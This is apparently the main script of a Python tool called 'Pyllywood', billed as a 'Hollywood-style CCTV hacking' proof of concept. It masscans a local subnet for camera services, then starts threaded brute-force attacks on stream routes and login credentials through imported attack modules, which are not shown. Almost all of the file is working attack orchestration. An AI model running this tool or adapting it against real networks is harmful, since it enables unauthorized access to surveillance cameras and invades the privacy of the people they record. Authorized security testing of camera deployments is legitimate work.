import pyfiglet #pip
from colorama import init
from termcolor import colored
import sys, threading, os, time, json
from libs import getports as gp
from libs import attack_creds_first as attack
from libs import attack_routes_first as routeattack

init()
ascii_banner = pyfiglet.figlet_format("Pyllywood.")
print("{}\n{}\n\n".format(ascii_banner, "Hollywood-style CCTV hacking - PoC"))

#gp.discover('192.168.2.0/24') # Custom port scan (slower detection)
gp.masscan_target('192.168.2.0/24') # Masscan (quicker detection) - DEBUG logging have to vanish somehow

print(colored("[*] Giving 10 seconds for threads to die...", 'yellow'))
time.sleep(10)

totalPortCount = 0
portScanResults = gp.targetList
for target in portScanResults:
    for port in portScanResults[target]:
        totalPortCount += 1

if totalPortCount == 0:
    print(colored("[!] No targets found. Try a different network.", 'red'))
    sys.exit(0)

print(colored("[*] Found {} targets with a total of {} ports".format(len(portScanResults), totalPortCount), 'yellow'))
print(colored("[-] All targets that do NOT require authentication will be excluded - these are not supported yet", 'red'))
print(colored("[*] Starting credentials and routes attacks. Please be patient...", 'yellow'))

for target in portScanResults:
    for port in portScanResults[target]:
        if portScanResults[target][port] == None:
            print(colored("[*] Target {}:{} requires a valid route first...".format(target, port), 'cyan'))
            thread = threading.Thread(target = routeattack.findValidRoutes, args = (target, port))
            thread.start()
            if threading.active_count() == 100:
                thread.join()
        else:
            print(colored("[*] Target {}:{} requires a valid account first...".format(target, port), 'cyan'))
            thread = threading.Thread(target = attack.attackCredentials, args = (target, port, portScanResults[target][port]))
            thread.start()
            if threading.active_count() == 100:
                thread.join()
